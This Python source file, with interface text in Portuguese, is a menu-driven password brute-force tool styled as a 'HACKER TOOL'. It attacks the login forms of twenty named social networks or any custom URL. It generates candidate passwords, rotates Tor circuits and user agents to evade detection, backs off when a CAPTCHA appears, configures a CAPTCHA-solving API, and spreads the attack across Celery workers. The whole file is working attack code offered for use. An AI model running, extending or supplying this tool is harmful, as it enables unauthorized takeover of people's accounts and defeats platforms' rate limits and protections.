import requests
import random
import time
import socket
import socks
from itertools import product
import sys
import os
import threading
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn
from rich.table import Table
from rich.theme import Theme
from rich.text import Text
from rich import box
from fake_useragent import UserAgent
import warnings
import json
from pathlib import Path
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from celery import Celery
from redis import Redis

# Configurações iniciais
warnings.filterwarnings("ignore")
VERSION = "3.1"
CONFIG_FILE = "brute_config.json"

# Configuração do tema para interface rica
custom_theme = Theme({
    "success": "bold green",
    "error": "bold red",
    "warning": "bold yellow",
    "info": "bold blue",
    "header": "bold cyan",
    "prompt": "bold magenta"
})
console = Console(theme=custom_theme)

# Configuração do Celery para ataque distribuído
app = Celery('brute_force', broker='redis://localhost:6379/0')

class AttackState:
    def __init__(self):
        self.found = False
        self.password = None
        self.attempts = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.last_proxy_rotation = 0
        self.form_info = None

state = AttackState()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def skull_art():
    console.print(Panel.fit("""
          ______
        .-"      "-.
       /            \\
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
         `--------`
    """, style="bold red"))

def show_banner():
    clear_screen()
    skull_art()
    console.print(Panel.fit(f"[header]HACKER TOOL v{VERSION} - FORÇA BRUTA AVANÇADA[/]", 
                          subtitle="by Security Researcher", box=box.DOUBLE))

def save_config(config):
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        console.print(f"[error]Erro ao salvar configuração: {str(e)}[/]")

def load_config():
    try:
        if Path(CONFIG_FILE).exists():
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        console.print(f"[warning]Erro ao carregar configuração: {str(e)}[/]")
    return {}

def menu():
    show_banner()
    table = Table(show_header=False, box=None)
    table.add_column(style="bold cyan", width=30)
    table.add_row("1. Ataque a Redes Sociais")
    table.add_row("2. Ataque a URL Customizada")
    table.add_row("3. Configurar Proxy/Tor")
    table.add_row("4. Configurações Avançadas")
    table.add_row("5. Ataque com Navegador (Selenium)")
    table.add_row("6. Ataque Distribuído")
    table.add_row("7. Sair")
    console.print(table)
    
    while True:
        try:
            choice = int(console.input("[prompt]>> [/]"))
            if 1 <= choice <= 7:
                return choice
            console.print("[error]Opção inválida! Escolha entre 1-7[/]")
        except ValueError:
            console.print("[error]Entrada inválida! Digite um número.[/]")

def social_media_menu():
    show_banner()
    console.print(Panel.fit("[header]REDES SOCIAIS DISPONÍVEIS[/]", box=box.ROUNDED))
    
    options = [
        "Facebook", "Instagram", "Twitter", "LinkedIn", "WhatsApp",
        "Telegram", "Snapchat", "Pinterest", "Reddit", "TikTok",
        "YouTube", "Twitch", "Tumblr", "Flickr", "VK",
        "Weibo", "QQ", "Douyin", "Line", "Discord",
        "Voltar"
    ]
    
    for i, option in enumerate(options, 1):
        console.print(f"[cyan]{i:>2}.[/] {option}")
    
    while True:
        try:
            choice = int(console.input("\n[prompt]Selecione a rede social: [/]"))
            if 1 <= choice <= 21:
                return choice
            console.print("[error]Opção inválida! Escolha entre 1-21[/]")
        except ValueError:
            console.print("[error]Entrada inválida! Digite um número.[/]")

def get_target_info():
    username = console.input("[prompt]Digite o nome de usuário/alvo: [/]")
    
    while True:
        try:
            min_length = int(console.input("[prompt]Comprimento mínimo da senha: [/]"))
            max_length = int(console.input("[prompt]Comprimento máximo da senha: [/]"))
            if min_length > max_length:
                console.print("[error]O comprimento mínimo não pode ser maior que o máximo![/]")
                continue
            break
        except ValueError:
            console.print("[error]Entrada inválida! Digite um número.[/]")
    
    chars = console.input("[prompt]Caracteres para testar (deixe em branco para todos os imprimíveis): [/]")
    
    if not chars:
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?'
    
    use_wordlist = console.input("[prompt]Deseja usar uma wordlist? (s/n): [/]").lower() == 's'
    wordlist_path = None
    
    if use_wordlist:
        wordlist_path = console.input("[prompt]Caminho para o arquivo de wordlist: [/]")
        if not Path(wordlist_path).exists():
            console.print("[error]Arquivo não encontrado![/]")
            wordlist_path = None
    
    return username, min_length, max_length, chars, wordlist_path

def configure_proxy():
    show_banner()
    console.print(Panel.fit("[header]CONFIGURAÇÃO DE PROXY[/]", box=box.ROUNDED))
    console.print("1. Usar Tor (padrão: 127.0.0.1:9050)")
    console.print("2. Configurar proxy manualmente")
    console.print("3. Não usar proxy")
    console.print("4. Rotação automática de proxies (Tor)")
    
    choice = int(console.input("[prompt]Escolha: [/]"))
    
    config = load_config()
    proxy_config = config.get("proxy", {})
    
    if choice == 1:
        proxy_config.update({
            "type": "tor",
            "host": "127.0.0.1",
            "port": 9050,
            "auto_rotate": False
        })
        set_proxy("127.0.0.1", 9050, "SOCKS5")
        console.print("[success]Proxy Tor configurado![/]")
    elif choice == 2:
        proxy_type = console.input("[prompt]Tipo de proxy (SOCKS5/HTTP): [/]").upper()
        host = console.input("[prompt]Host: [/]")
        port = int(console.input("[prompt]Porta: [/]"))
        
        proxy_config.update({
            "type": proxy_type.lower(),
            "host": host,
            "port": port,
            "auto_rotate": False
        })
        
        set_proxy(host, port, proxy_type)
        console.print(f"[success]Proxy {proxy_type} configurado![/]")
    elif choice == 3:
        proxy_config.update({"type": "none"})
        socks.set_default_proxy()
        console.print("[success]Proxy desativado![/]")
    elif choice == 4:
        proxy_config.update({
            "type": "tor",
            "host": "127.0.0.1",
            "port": 9050,
            "auto_rotate": True
        })
        set_proxy("127.0.0.1", 9050, "SOCKS5")
        console.print("[success]Proxy Tor com rotação automática configurado![/]")
    
    config["proxy"] = proxy_config
    save_config(config)
    time.sleep(2)

def set_proxy(host, port, proxy_type):
    if proxy_type == "SOCKS5":
        socks.set_default_proxy(socks.SOCKS5, host, port)
    else:
        socks.set_default_proxy(socks.HTTP, host, port)
    socket.socket = socks.socksocket

def rotate_tor_proxy():
    config = load_config()
    proxy_config = config.get("proxy", {})
    
    if proxy_config.get("auto_rotate", False):
        try:
            with requests.Session() as s:
                s.proxies = {
                    'http': 'socks5h://127.0.0.1:9050',
                    'https': 'socks5h://127.0.0.1:9050'
                }
                s.get("http://httpbin.org/ip")
                s.post("http://127.0.0.1:9051/control/newnym")
                time.sleep(5)  # Esperar o circuito ser renovado
        except Exception as e:
            console.print(f"[warning]Erro ao rotacionar circuito Tor: {str(e)}[/]")

def get_social_media_url(choice):
    urls = {
        1: "https://www.facebook.com/login.php",
        2: "https://www.instagram.com/accounts/login/",
        3: "https://twitter.com/login",
        4: "https://www.linkedin.com/login",
        5: "https://web.whatsapp.com",
        6: "https://web.telegram.org",
        7: "https://accounts.snapchat.com",
        8: "https://www.pinterest.com/login/",
        9: "https://www.reddit.com/login",
        10: "https://www.tiktok.com/login",
        11: "https://accounts.google.com/ServiceLogin?service=youtube",
        12: "https://www.twitch.tv/login",
        13: "https://www.tumblr.com/login",
        14: "https://www.flickr.com/signin",
        15: "https://vk.com/login",
        16: "https://weibo.com/login.php",
        17: "https://im.qq.com/login",
        18: "https://www.douyin.com/login",
        19: "https://line.me",
        20: "https://discord.com/login"
    }
    return urls.get(choice)

def get_headers():
    ua = UserAgent()
    return {
        'User-Agent': ua.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }

def check_captcha(response):
    captcha_indicators = [
        'recaptcha', 'hcaptcha', 'turnstile',
        'cloudflare-challenge', 'data-sitekey',
        'captcha-container', '/captcha/', 'challenge.js'
    ]
    return any(ind.lower() in response.text.lower() for ind in captcha_indicators)

def analyze_login_form(url):
    try:
        session = requests.Session()
        headers = get_headers()
        response = session.get(url, headers=headers)
        
        if response.status_code != 200:
            console.print(f"[error]Erro ao acessar URL: {response.status_code}[/]")
            return None
        
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')
        
        if not form:
            console.print("[error]Nenhum formulário de login encontrado![/]")
            return None
        
        form_action = form.get('action', url)
        if not form_action.startswith('http'):
            from urllib.parse import urljoin
            form_action = urljoin(url, form_action)
        
        form_method = form.get('method', 'POST').upper()
        
        # Encontra todos os campos do formulário
        fields = {}
        for inp in form.find_all('input'):
            if inp.get('name'):
                fields[inp['name']] = inp.get('value', '')
        
        return {
            'action': form_action,
            'method': form_method,
            'fields': fields,
            'cookies': session.cookies.get_dict()
        }
    except Exception as e:
        console.print(f"[error]Erro ao analisar formulário: {str(e)}[/]")
        return None

def adaptive_delay(target_url):
    base_delay = random.uniform(1.5, 3.0)
    if 'facebook' in target_url or 'linkedin' in target_url:
        return base_delay * 2
    return base_delay

def headless_attack(url, username, password):
    try:
        # Configuração para o Termux (usando ChromeDriver)
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        
        # Você precisará ter o chromedriver instalado no Termux
        driver = webdriver.Chrome(options=options)
        
        driver.get(url)
        
        # Tenta encontrar campos de login
        username_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "username"))
        )
        password_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "password"))
        )
        
        username_field.send_keys(username)
        password_field.send_keys(password)
        
        # Tenta encontrar e clicar no botão de login
        login_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Log in') or contains(text(),'Sign in')]"))
        )
        login_button.click()
        
        # Verifica se o login foi bem-sucedido
        WebDriverWait(driver, 10).until(
            lambda d: "dashboard" in d.current_url.lower() or "home" in d.current_url.lower()
        )
        
        driver.quit()
        return True
        
    except TimeoutException:
        try:
            driver.quit()
        except:
            pass
        return False
    except Exception as e:
        console.print(f"[error]Erro no navegador: {str(e)}[/]")
        try:
            driver.quit()
        except:
            pass
        return False

def brute_force_worker(url, username, password, timeout=10):
    if state.found:
        return False
    
    try:
        session = requests.Session()
        headers = get_headers()
        
        if time.time() - state.last_proxy_rotation > 300:
            rotate_tor_proxy()
            state.last_proxy_rotation = time.time()
        
        # Se não temos informações do formulário, analisamos primeiro
        if not state.form_info:
            state.form_info = analyze_login_form(url)
            if not state.form_info:
                return False
        
        # Configura cookies se houver
        if state.form_info.get('cookies'):
            session.cookies.update(state.form_info['cookies'])
        
        # Prepara os dados da requisição
        post_data = {
            **state.form_info['fields'],  # Campos ocultos e padrões
            'username': username,        # Substitui os campos de login
            'password': password
        }
        
        # Adiciona cabeçalhos importantes
        headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': f'https://{url.split("/")[2]}',
            'Referer': url
        })
        
        # Faz a requisição
        response = session.request(
            state.form_info['method'],
            state.form_info['action'],
            data=post_data,
            headers=headers,
            timeout=timeout,
            allow_redirects=True
        )
        
        # Verifica CAPTCHA
        if check_captcha(response):
            console.print("[warning]CAPTCHA detectado! Pausando por 60 segundos...[/]")
            time.sleep(60)
            return False
        
        # Verificação melhorada de login bem-sucedido
        login_success = False
        
        # Verifica status code e redirecionamento
        if response.status_code == 200:
            # Verifica se houve redirecionamento para página diferente do login
            if response.url != url and response.url != state.form_info['action']:
                login_success = True
            # Verifica por mensagens de erro comuns
            elif any(msg in response.text.lower() for msg in ['login error', 'invalid', 'incorrect']):
                login_success = False
            # Verifica por elementos que indicam sucesso (logout button, etc)
            elif 'logout' in response.text.lower() or 'sign out' in response.text.lower():
                login_success = True
        
        # Verifica se é uma API JSON
        elif 'application/json' in response.headers.get('Content-Type', ''):
            try:
                json_data = response.json()
                login_success = json_data.get('success', False) or 'token' in json_data
            except:
                login_success = False
        
        with state.lock:
            state.attempts += 1
            
            if login_success and not state.found:
                state.found = True
                state.password = password
                return True
        
        time.sleep(adaptive_delay(url))
        return False

    except Exception as e:
        with state.lock:
            state.attempts += 1
        console.print(f"[warning]Erro na requisição: {str(e)}[/]")
        return False

def generate_passwords(min_len, max_len, chars, base_word=None):
    # Gera senhas simples baseadas em caracteres
    for length in range(min_len, max_len + 1):
        for attempt in product(chars, repeat=length):
            yield ''.join(attempt)
    
    # Adiciona variações comuns se houver uma palavra base
    if base_word:
        # Variações comuns
        variations = [
            base_word,
            base_word + "123",
            base_word + "1234",
            base_word + "12345",
            base_word + "!",
            base_word + "@",
            base_word + "#",
            base_word.upper(),
            base_word.lower(),
            base_word.capitalize(),
            base_word + "2023",
            base_word + "2024",
            base_word + "1",
            base_word + "12",
            base_word + "123456",
            base_word + ".",
            base_word + "?",
        ]
        
        # Adiciona algumas transformações leet speak básicas
        leet_replacements = {
            'a': '4',
            'e': '3',
            'i': '1',
            'o': '0',
            's': '5',
            't': '7'
        }
        
        leet_word = []
        for char in base_word:
            if char.lower() in leet_replacements:
                leet_word.append(leet_replacements[char.lower()])
            else:
                leet_word.append(char)
        variations.append(''.join(leet_word))
        
        for variation in variations:
            if min_len <= len(variation) <= max_len:
                yield variation

def load_wordlist(path):
    try:
        with open(path, 'r', errors='ignore') as f:
            for line in f:
                yield line.strip()
    except Exception as e:
        console.print(f"[error]Erro ao ler wordlist: {str(e)}[/]")
        return []

def show_stats():
    attempts = state.attempts
    elapsed = time.time() - state.start_time
    speed = attempts / elapsed if elapsed > 0 else 0
    
    console.print(f"\n[info]Tentativas: {attempts}[/]")
    console.print(f"[info]Velocidade: {speed:.2f} senhas/segundo[/]")
    console.print(f"[info]Tempo decorrido: {elapsed:.2f} segundos[/]")
    
    if state.found:
        console.print(f"[success]SENHA ENCONTRADA: {state.password}[/]")
        return True
    return False

def start_brute_force(url, username, min_len, max_len, chars, wordlist_path=None):
    state.__init__()  # Resetar estado
    
    console.print(f"\n[header]Iniciando ataque de força bruta em {url}[/]")
    console.print(f"[info]Alvo: {username}[/]")
    console.print(f"[info]Intervalo de senhas: {min_len}-{max_len} caracteres[/]")
    
    password_generator = load_wordlist(wordlist_path) if wordlist_path else generate_passwords(min_len, max_len, chars, username)
    
    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        transient=True
    ) as progress:
        task = progress.add_task("[cyan]Testando senhas...", total=None)
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            for password in password_generator:
                if state.found:
                    break
                
                futures.append(executor.submit(brute_force_worker, url, username, password))
          
                if len(futures) % 100 == 0:
                    progress.update(task, description=f"[cyan]Testando senhas... {state.attempts} tentativas")
                    
                    if show_stats():
                        break
            
            for future in futures:
                future.result()
    
    show_stats()

@app.task
def distributed_attack(node_id, url, username, password_batch):
    results = {}
    for pwd in password_batch:
        if brute_force_worker(url, username, pwd):
            results['success'] = pwd
            break
    return results

def start_distributed_attack(url, username, min_len, max_len, chars):
    console.print("[header]Iniciando ataque distribuído...[/]")
    
    passwords = list(generate_passwords(min_len, max_len, chars))
    batch_size = 1000
    batches = [passwords[i:i+batch_size] for i in range(0, len(passwords), batch_size)]
    
    for i, batch in enumerate(batches):
        distributed_attack.delay(i, url, username, batch)
    
    console.print("[success]Tarefas distribuídas para workers![/]")

def advanced_settings():
    show_banner()
    console.print(Panel.fit("[header]CONFIGURAÇÕES AVANÇADAS[/]", box=box.ROUNDED))
    
    config = load_config()
    
    console.print("1. Configurar tempo máximo de tentativa")
    console.print("2. Configurar delay entre tentativas")
    console.print("3. Configurar número de threads")
    console.print("4. Configurar solver de CAPTCHA")
    console.print("5. Limpar configurações salvas")
    console.print("6. Voltar")
    
    choice = int(console.input("[prompt]Escolha: [/]"))
    
    if choice == 1:
        timeout = int(console.input("[prompt]Tempo máximo por tentativa (segundos): [/]"))
        config["timeout"] = timeout
        console.print(f"[success]Timeout configurado para {timeout} segundos[/]")
    elif choice == 2:
        min_delay = float(console.input("[prompt]Delay mínimo entre tentativas (segundos): [/]"))
        max_delay = float(console.input("[prompt]Delay máximo entre tentativas (segundos): [/]"))
        config["delays"] = {"min": min_delay, "max": max_delay}
        console.print(f"[success]Delay configurado entre {min_delay}-{max_delay} segundos[/]")
    elif choice == 3:
        threads = int(console.input("[prompt]Número máximo de threads: [/]"))
        config["threads"] = threads
        console.print(f"[success]Número de threads configurado para {threads}[/]")
    elif choice == 4:
        api_key = console.input("[prompt]Chave API do 2Captcha: [/]")
        config["captcha_api"] = api_key
        console.print("[success]API de CAPTCHA configurada![/]")
    elif choice == 5:
        try:
            os.remove(CONFIG_FILE)
            console.print("[success]Configurações removidas![/]")
        except Exception as e:
            console.print(f"[error]Erro ao remover configurações: {str(e)}[/]")
    
    save_config(config)
    time.sleep(2)

def main():
    try:
        while True:
            choice = menu()
            
            if choice == 1:
                sm_choice = social_media_menu()
                if sm_choice == 21:
                    continue
                
                url = get_social_media_url(sm_choice)
                username, min_len, max_len, chars, wordlist_path = get_target_info()
                start_brute_force(url, username, min_len, max_len, chars, wordlist_path)
                
                if not state.found:
                    console.print("[error]Ataque concluído - senha não encontrada[/]")
                input("\n[prompt]Pressione Enter para continuar...[/]")
            
            elif choice == 2:
                url = console.input("[prompt]Digite a URL de login: [/]")
                username, min_len, max_len, chars, wordlist_path = get_target_info()
                start_brute_force(url, username, min_len, max_len, chars, wordlist_path)
                
                if not state.found:
                    console.print("[error]Ataque concluído - senha não encontrada[/]")
                input("\n[prompt]Pressione Enter para continuar...[/]")
            
            elif choice == 3:
                configure_proxy()
            
            elif choice == 4:
                advanced_settings()
            
            elif choice == 5:
                url = console.input("[prompt]Digite a URL de login: [/]")
                username = console.input("[prompt]Digite o nome de usuário: [/]")
                password = console.input("[prompt]Digite a senha para testar: [/]")
                
                success = headless_attack(url, username, password)
                if success:
                    console.print("[success]Login bem-sucedido no modo headless![/]")
                else:
                    console.print("[error]Falha no login[/]")
                input("\n[prompt]Pressione Enter para continuar...[/]")
            
            elif choice == 6:
                url = console.input("[prompt]Digite a URL de login: [/]")
                username, min_len, max_len, chars, _ = get_target_info()
                start_distributed_attack(url, username, min_len, max_len, chars)
                input("\n[prompt]Pressione Enter para continuar...[/]")
            
            elif choice == 7:
                console.print("[header]Saindo... Até a próxima![/]")
                time.sleep(2)
                break
    
    except KeyboardInterrupt:
        console.print("\n[error]Operação cancelada pelo usuário.[/]")
    except Exception as e:
        console.print(f"[error]Erro fatal: {str(e)}[/]")
    finally:
        socks.set_default_proxy()

if __name__ == "__main__":
    main()
